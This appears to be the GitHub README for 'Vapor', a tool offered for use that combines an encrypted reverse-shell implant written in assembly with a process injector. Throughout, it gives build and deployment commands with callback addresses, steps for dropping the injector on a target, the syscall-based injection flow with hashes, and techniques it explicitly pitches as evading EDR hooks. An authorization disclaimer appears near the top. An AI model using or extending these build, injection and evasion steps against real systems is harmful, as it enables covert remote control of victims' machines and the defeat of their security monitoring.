<div align="center">

<picture>
  <source media="(prefers-color-scheme: dark)" srcset="https://raw.githubusercontent.com/Real-Fruit-Snacks/Vapor/main/docs/assets/logo-dark.svg">
  <source media="(prefers-color-scheme: light)" srcset="https://raw.githubusercontent.com/Real-Fruit-Snacks/Vapor/main/docs/assets/logo-light.svg">
  <img alt="Vapor" src="https://raw.githubusercontent.com/Real-Fruit-Snacks/Vapor/main/docs/assets/logo-dark.svg" width="520">
</picture>

![Assembly](https://img.shields.io/badge/language-Assembly-6E4C13.svg)
![Platform](https://img.shields.io/badge/platform-Windows-lightgrey)
![License](https://img.shields.io/badge/license-MIT-blue.svg)

**ChaCha20-Poly1305 encrypted reverse shell and process injector in pure x86_64 NASM assembly**

A ~3.6 KB position-independent shellcode implant that connects back over raw TCP with RFC 8439 authenticated encryption. All Windows APIs resolved at runtime via PEB walking — zero imports, zero dependencies. Ships with a Hell's Gate + indirect syscall process injector for EDR-evasive deployment.

> **Authorization Required**: This tool is designed exclusively for authorized security testing with explicit written permission. Unauthorized access to computer systems is illegal and may result in criminal prosecution.

[Quick Start](#quick-start) • [Injector](#injector) • [Wire Protocol](#wire-protocol) • [Architecture](#architecture) • [Security](#security)

</div>

---

## Highlights

<table>
<tr>
<td width="50%">

**ChaCha20-Poly1305 AEAD**
Full RFC 8439 authenticated encryption in pure assembly. 256-bit pre-shared key, fresh random nonce per message via `SystemFunction036` (RtlGenRandom). Tampered payloads silently rejected.

**PEB Walk + Hash Lookup**
All Windows APIs resolved at runtime via PEB walking and ror13 hash matching. No import table, no API name strings — just hashes baked into the binary. `GetProcAddress` handles forwarded exports (e.g., `SystemFunction036`).

**Piped Command Execution**
Commands execute via `CreateProcessA` with `cmd.exe /c`, capturing stdout and stderr through anonymous pipes. PeekNamedPipe polling streams output in real-time with a 30-second timeout.

**Hell's Gate + Indirect Syscalls**
Syscall numbers extracted at runtime from ntdll stubs with Halo's Gate fallback for hooked functions. All NT syscalls execute via an indirect gadget found in ntdll — the return address traces back to ntdll, not the injector.

</td>
<td width="50%">

**~3.6 KB Shellcode**
The entire implant — API resolution, networking, crypto, command execution, nonce generation — fits in ~3,600 bytes of position-independent code. No compiler, no runtime, no bloat.

**No Dependencies**
Zero DLL imports. Every API (kernel32, ws2_32, advapi32) is resolved dynamically from the PEB. Nothing to link against, nothing to install on the target.

**Dual Output Formats**
Builds as both raw PIC shellcode (`vapor.bin`) for injection and a minimal PE (`vapor.exe`) for direct execution. Same source, same crypto, two deployment options.

**Early Bird APC Injection**
Target process created suspended via `CreateProcessA`. Shellcode written to remote memory (RW to RX) using NT syscalls, then queued as an APC to the main thread. Fires before the process entry point — before EDR userland hooks initialize.

</td>
</tr>
</table>

---

## Quick Start

### Prerequisites

<table>
<tr>
<th>Requirement</th>
<th>Version</th>
<th>Purpose</th>
</tr>
<tr>
<td>NASM</td>
<td>Latest</td>
<td>x86_64 assembler</td>
</tr>
<tr>
<td>MinGW-w64</td>
<td>Latest</td>
<td>Linker (<code>x86_64-w64-mingw32-ld</code>)</td>
</tr>
<tr>
<td>Python</td>
<td>3.8+</td>
<td>Listener and build script</td>
</tr>
<tr>
<td>cryptography</td>
<td>Latest</td>
<td><code>pip install cryptography</code></td>
</tr>
</table>

### Build

```bash
# Clone
git clone https://github.com/Real-Fruit-Snacks/Vapor.git
cd Vapor

# Build — generates a random PSK, assembles, prints the listener command
./build.sh 10.10.14.1 443

# Or specify your own key
./build.sh 10.10.14.1 443 <64-char-hex>

# Or use make directly
make LHOST=10.10.14.1 LPORT=443 KEY=<64-char-hex> all
```

### Verification

```bash
# Start the listener (build.sh prints this command with your key)
python3 listener.py --lport 443 --key <key>

# Deploy vapor.exe to target (or inject vapor.bin via injector.exe)
```

> The build script generates a random 256-bit PSK if you don't provide one, assembles the implant (shellcode + PE), builds the injector, and prints the exact listener command with your key.

### Injector Deployment

```bash
# Build injector targeting a specific process (default: RuntimeBroker.exe)
make LHOST=10.10.14.1 LPORT=443 KEY=<key> TARGET="C:\Windows\System32\svchost.exe" all

# Deploy injector.exe to target — it embeds vapor.bin and injects on execution
```

The injector embeds `vapor.bin` at build time via `incbin`. Drop `injector.exe` on the target and run it — no additional files needed.

---

## Injector

The process injector (`injector.asm` / `injector.exe`) deploys `vapor.bin` into a target process using direct NT syscalls — no high-level API calls that EDR can hook.

### Technique Stack

| Technique | Purpose |
|-----------|---------|
| **Hell's Gate** | Extract syscall numbers (SSNs) at runtime from ntdll stub opcodes (`4C 8B D1 B8 XX XX 00 00`) |
| **Halo's Gate** | Fallback when stubs are hooked — scan neighbor stubs +/-16 positions, adjust SSN by distance |
| **Indirect Syscalls** | Jump to ntdll's `syscall; ret` gadget (`0F 05 C3`) so the return address is within ntdll |
| **Early Bird APC** | Queue shellcode as APC to suspended process — fires before entry point and EDR hooks |

### Injection Flow

```
1. PEB walk → find ntdll.dll + kernel32.dll
2. Resolve CreateProcessA, ExitProcess via export table hash walk
3. Hell's Gate: extract SSNs for 5 NT functions from ntdll stubs
4. Find indirect syscall gadget (0F 05 C3) in ntdll .text section
5. CreateProcessA(TARGET, CREATE_SUSPENDED)
6. NtAllocateVirtualMemory — allocate RW memory in target
7. NtWriteVirtualMemory — write vapor.bin shellcode
8. NtProtectVirtualMemory — change RW → RX
9. NtQueueApcThread — queue shellcode to suspended main thread
10. NtResumeThread — thread wakes, APC fires, shellcode executes
```

### NT Syscalls Used

| Syscall | ror13 Hash | Purpose |
|---------|------------|---------|
| `NtAllocateVirtualMemory` | `0xd33bcabd` | Allocate RW memory in target process |
| `NtWriteVirtualMemory` | `0xc5108cc2` | Write shellcode into allocated memory |
| `NtProtectVirtualMemory` | `0x8c394d89` | Flip memory protection RW to RX |
| `NtQueueApcThread` | `0x52e9a746` | Queue APC to suspended thread |
| `NtResumeThread` | `0xc54a46c8` | Resume thread to trigger APC execution |

### Build-time Target

```bash
# Default: RuntimeBroker.exe
make all

# Custom target
make TARGET="C:\Windows\System32\svchost.exe" all
make TARGET="C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE" all
```

---

## Wire Protocol

Every message on the wire follows the same framing, in both directions:

```
┌──────────┬──────────────┬────────────────┬──────────┐
│ len (4B) │ nonce (12B)  │ ciphertext (N) │ mac (16B)│
│ LE u32   │ random       │ ChaCha20       │ Poly1305 │
└──────────┴──────────────┴────────────────┴──────────┘
```

- **len**: Little-endian uint32, covers `nonce + ciphertext + mac` (everything after the length field)
- **nonce**: 12 random bytes from `SystemFunction036` (RtlGenRandom)
- **ciphertext**: ChaCha20 stream cipher (counter starts at 1, per RFC 8439)
- **mac**: Poly1305 tag computed over `pad16(ciphertext) || le64(0) || le64(ct_len)` using one-time key derived from ChaCha20 block 0

The operator sends plaintext commands (e.g., `whoami`, `dir`). The implant executes them via `cmd.exe /c` and returns the output. Send `EXIT` to cleanly disconnect.

---

## Internals

### API Resolution

1. Walk the PEB (`gs:[0x60]`) to `PEB_LDR_DATA` then `InMemoryOrderModuleList`
2. Hash each module name with ror13 to find `kernel32.dll`
3. Walk the export table, hashing each export name with ror13 to match
4. `GetProcAddress` resolves forwarded exports (advapi32 to cryptbase forwarding for `SystemFunction036`)

### Crypto Implementation

All crypto is implemented in pure x86_64 assembly:

- **ChaCha20 quarter-round**: Register-based, 10 double-rounds (20 rounds total)
- **ChaCha20 block**: Generates 64-byte keystream blocks
- **ChaCha20 encrypt**: XOR keystream with plaintext/ciphertext, counter starting at 1
- **Poly1305 MAC**: Full mod 2^130-5 arithmetic with 128-bit partial products and proper overflow handling via `mul` (not `lea` truncation)
- **AEAD**: ChaCha20 block 0 produces Poly1305 one-time key, encrypt with counter 1+, MAC over ciphertext per RFC 8439 Section 2.8

### Hell's Gate SSN Extraction

```
1. Read first 4 bytes of ntdll stub
2. Check for mov r10, rcx; mov eax, SSN pattern (4C 8B D1 B8)
3. If matched: SSN = bytes [4..5] — done
4. If hooked (JMP patch): Halo's Gate fallback
   a. Scan neighbor stubs ±32 bytes (up to 16 in each direction)
   b. Find first unhooked neighbor
   c. SSN = neighbor_SSN ± distance
```

### Memory Layout

The implant allocates ~148 KB on the stack (37 guard pages probed):

| Offset | Size | Purpose |
|--------|------|---------|
| `+0` | 8 KB | Receive buffer (decrypted commands) |
| `+8192` | 64 KB | Output buffer (command stdout/stderr) |
| `+73728` | 64 KB | Crypto buffer (nonce + ciphertext + MAC) |
| `+139328` | 8 KB | Command string (`cmd.exe /c ...`) |
| `+147584` | 480 B | STARTUPINFO, PROCESS_INFORMATION, pipe handles, etc. |

---

## Architecture

```
vapor/
├── vapor.asm          # Implant source (~1636 lines x86_64 NASM)
├── injector.asm       # Hell's Gate + indirect syscall + Early Bird APC injector
├── listener.py        # Python TCP listener with interactive CLI
├── build.sh           # One-command build script (key gen + assemble)
├── Makefile           # NASM + ld build targets (vapor + injector)
└── docs/
    ├── index.html     # GitHub Pages landing page
    └── assets/
        ├── logo-dark.svg
        └── logo-light.svg
```

### Data Flow

```
[Target]                          [Operator]
 vapor  ────── raw TCP ──────>  listener.py
        <── encrypted cmd ────
        ── encrypted output ──>
```

| Layer | Implementation |
|-------|----------------|
| **Transport** | Raw TCP socket via `WSASocketA` / `connect` |
| **Encryption** | ChaCha20-Poly1305 AEAD (RFC 8439), pre-shared 256-bit key |
| **Nonce** | 12 bytes, random per message via `SystemFunction036` (RtlGenRandom) |
| **Wire Format** | `[len(4)][nonce(12)][ciphertext][mac(16)]` |
| **API Resolution** | PEB walk → LDR → export table → ror13 hash matching |
| **Execution** | `CreateProcessA` with `cmd.exe /c`, piped stdout+stderr, PeekNamedPipe polling |
| **Injection** | Hell's Gate SSN extraction → indirect syscall via ntdll gadget → Early Bird APC |
| **Listener** | Python 3 with `cryptography` library, Catppuccin Mocha themed CLI |

---

## Configuration

### Compile-time (Makefile variables)

| Variable | Default | Description |
|----------|---------|-------------|
| `LHOST` | `127.0.0.1` | Callback IP |
| `LPORT` | `443` | Callback port |
| `KEY` | Random 256-bit | Pre-shared key (64 hex chars) |
| `TARGET` | `C:\Windows\System32\RuntimeBroker.exe` | Injector target process path |

### Listener arguments

| Flag | Default | Description |
|------|---------|-------------|
| `--lhost` | `0.0.0.0` | Listen address |
| `--lport` | `443` | Listen port |
| `--key` | Required | 64-char hex PSK |

### Build Outputs

| File | Size | Description |
|------|------|-------------|
| `vapor.bin` | ~3.6 KB | Raw position-independent shellcode |
| `vapor.exe` | ~4 KB | Minimal PE for direct execution |
| `injector.exe` | ~8 KB | Process injector (embeds vapor.bin) |

---

## Platform Support

<table>
<tr>
<th>Feature</th>
<th>Windows x86_64</th>
</tr>
<tr>
<td>Reverse shell</td>
<td>Full</td>
</tr>
<tr>
<td>ChaCha20-Poly1305</td>
<td>Full</td>
</tr>
<tr>
<td>PEB API resolution</td>
<td>Full</td>
</tr>
<tr>
<td>PE direct execution</td>
<td>Full</td>
</tr>
<tr>
<td>Shellcode injection</td>
<td>Full</td>
</tr>
<tr>
<td>Hell's Gate syscalls</td>
<td>Full</td>
</tr>
<tr>
<td>Early Bird APC</td>
<td>Full</td>
</tr>
<tr>
<td>Listener (Python)</td>
<td>Cross-platform</td>
</tr>
</table>

---

## Testing

### Manual Testing

```bash
# Terminal 1: Start listener
python3 listener.py --lhost 127.0.0.1 --lport 4444 --key aabbccdd11223344aabbccdd11223344aabbccdd11223344aabbccdd11223344

# Terminal 2: Launch implant directly
.\vapor.exe

# Terminal 2 (alt): Launch via injector
.\injector.exe
```

---

## Security

### Vulnerability Reporting

See [SECURITY.md](SECURITY.md) for our vulnerability disclosure policy. Do not open public issues for security vulnerabilities — use [GitHub Security Advisories](https://github.com/Real-Fruit-Snacks/Vapor/security/advisories/new).

### Threat Model

Vapor is an offensive security tool. Its threat model assumes the operator has authorized access and is deploying against targets within scope.

**What Vapor does:**
- Authenticated encryption of all command and output traffic
- Runtime API resolution with no static imports
- Indirect syscalls to avoid userland hooks
- Early Bird injection before EDR initialization

**What Vapor does NOT do:**
- Evade kernel-level monitoring (ETW, kernel callbacks)
- Bypass AMSI or script-based detection
- Provide persistence across reboots
- Exfiltrate data outside the command channel
- Obfuscate network connection metadata (raw TCP)

---

## Future Work

- Reconnect with jittered backoff
- File upload/download commands
- Anti-debug / anti-sandbox checks
- Staged payload delivery
- SOCKS proxy pivoting

---

## License

MIT License. See [LICENSE](LICENSE) for details.

---

## Resources

- [Releases](https://github.com/Real-Fruit-Snacks/Vapor/releases)
- [Issues](https://github.com/Real-Fruit-Snacks/Vapor/issues)
- [Security Policy](https://github.com/Real-Fruit-Snacks/Vapor/blob/main/SECURITY.md)
- [Contributing](https://github.com/Real-Fruit-Snacks/Vapor/blob/main/CONTRIBUTING.md)
- [Changelog](https://github.com/Real-Fruit-Snacks/Vapor/blob/main/CHANGELOG.md)

---

<div align="center">

**Part of the Real-Fruit-Snacks water-themed security toolkit**

[Aquifer](https://github.com/Real-Fruit-Snacks/Aquifer) • [Cascade](https://github.com/Real-Fruit-Snacks/Cascade) • [Conduit](https://github.com/Real-Fruit-Snacks/Conduit) • [Deadwater](https://github.com/Real-Fruit-Snacks/Deadwater) • [Deluge](https://github.com/Real-Fruit-Snacks/Deluge) • [Depth](https://github.com/Real-Fruit-Snacks/Depth) • [Dew](https://github.com/Real-Fruit-Snacks/Dew) • [Droplet](https://github.com/Real-Fruit-Snacks/Droplet) • [Fathom](https://github.com/Real-Fruit-Snacks/Fathom) • [Flux](https://github.com/Real-Fruit-Snacks/Flux) • [Grotto](https://github.com/Real-Fruit-Snacks/Grotto) • [HydroShot](https://github.com/Real-Fruit-Snacks/HydroShot) • [Maelstrom](https://github.com/Real-Fruit-Snacks/Maelstrom) • [Rapids](https://github.com/Real-Fruit-Snacks/Rapids) • [Ripple](https://github.com/Real-Fruit-Snacks/Ripple) • [Riptide](https://github.com/Real-Fruit-Snacks/Riptide) • [Runoff](https://github.com/Real-Fruit-Snacks/Runoff) • [Seep](https://github.com/Real-Fruit-Snacks/Seep) • [Shallows](https://github.com/Real-Fruit-Snacks/Shallows) • [Siphon](https://github.com/Real-Fruit-Snacks/Siphon) • [Slipstream](https://github.com/Real-Fruit-Snacks/Slipstream) • [Spillway](https://github.com/Real-Fruit-Snacks/Spillway) • [Surge](https://github.com/Real-Fruit-Snacks/Surge) • [Tidemark](https://github.com/Real-Fruit-Snacks/Tidemark) • [Tidepool](https://github.com/Real-Fruit-Snacks/Tidepool) • [Undercurrent](https://github.com/Real-Fruit-Snacks/Undercurrent) • [Undertow](https://github.com/Real-Fruit-Snacks/Undertow) • [Vapor](https://github.com/Real-Fruit-Snacks/Vapor) • [Wellspring](https://github.com/Real-Fruit-Snacks/Wellspring) • [Whirlpool](https://github.com/Real-Fruit-Snacks/Whirlpool)

*Remember: With great power comes great responsibility.*

</div>
